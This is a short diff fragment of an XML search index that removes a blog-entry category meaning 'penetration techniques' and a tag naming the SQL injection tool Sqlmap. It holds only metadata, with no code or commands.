-        <category>渗透技巧</category>
-      </categories>
-      <tags>
-        <tag>Sqlmap</tag>
       </tags>
   </entry>
 </search>
